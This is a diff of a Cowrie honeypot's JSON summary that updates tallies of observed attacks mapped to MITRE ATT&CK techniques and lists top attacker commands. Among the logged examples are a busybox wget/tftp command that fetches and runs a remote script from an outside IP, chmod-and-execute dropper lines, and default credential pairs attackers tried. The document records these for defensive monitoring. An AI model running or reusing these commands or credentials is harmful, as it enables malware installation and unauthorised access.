@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-16 18:01:12",
+  "generated": "2026-08-16 19:02:54",
   "totals": {
-    "commands": 1448,
-    "login_failed": 4285,
-    "login_success": 158,
-    "sessions": 3176
+    "commands": 1495,
+    "login_failed": 4798,
+    "login_success": 165,
+    "sessions": 3417
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 4285,
+      "count": 4798,
       "examples": [
         "usr1cv8 / usr1cv8",
         "serv / serv",
@@ -21,14 +21,14 @@
         "admin / Aa123456"
       ],
       "first": "2026-08-16T00:00:42.329332Z",
-      "last": "2026-08-16T18:00:59.398520Z",
-      "unique_ips": 115
+      "last": "2026-08-16T19:02:49.285435Z",
+      "unique_ips": 120
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 343,
+      "count": 345,
       "examples": [
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
@@ -37,7 +37,7 @@
         ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/"
       ],
       "first": "2026-08-16T00:06:13.111253Z",
-      "last": "2026-08-16T17:42:47.461814Z",
+      "last": "2026-08-16T18:03:01.672024Z",
       "unique_ips": 31
     },
     {
@@ -60,7 +60,7 @@
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 158,
+      "count": 165,
       "examples": [
         "admin / admin",
         "enable\\x00 / linuxshell\\x00",
@@ -69,8 +69,8 @@
         "installer / installer"
       ],
       "first": "2026-08-16T00:06:11.647402Z",
-      "last": "2026-08-16T17:58:14.209662Z",
-      "unique_ips": 92
+      "last": "2026-08-16T18:56:56.818075Z",
+      "unique_ips": 96
     },
     {
       "id": "T1033",
@@ -197,11 +197,11 @@
     ],
     [
       "sh",
-      97
+      100
     ],
     [
       "shell",
-      64
+      67
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
@@ -209,11 +209,11 @@
     ],
     [
       "system",
-      45
+      47
     ],
     [
       "enable",
-      43
+      45
     ],
     [
       "shel",
@@ -221,7 +221,7 @@
     ],
     [
       "linuxshell",
-      31
+      33
     ],
     [
       "ping ;sh",
